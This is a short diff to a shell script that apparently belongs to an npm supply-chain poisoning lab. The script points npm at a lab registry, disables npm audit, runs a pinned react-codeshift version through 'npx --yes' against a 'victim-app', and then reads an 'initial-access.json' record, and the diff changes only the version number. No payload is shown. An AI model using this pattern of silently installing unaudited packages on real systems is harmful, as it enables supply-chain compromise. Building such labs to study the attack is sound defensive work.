@@ -32,7 +32,7 @@ set +a
 npm config set registry "$LAB_REGISTRY_URL" --location=user
 npm config set audit false --location=user
 cd ~/npm_poisoning_poc/victim-app/frontend
-LAB_RUN_ID=LAB-001 npx --yes react-codeshift@1.1.0 \
+LAB_RUN_ID=LAB-001 npx --yes react-codeshift@1.3.1 \
   --transform=react-codeshift/transforms/rename-unsafe-lifecycles.js \
   ./src
 cat ~/.local/state/package-lab/initial-access.json
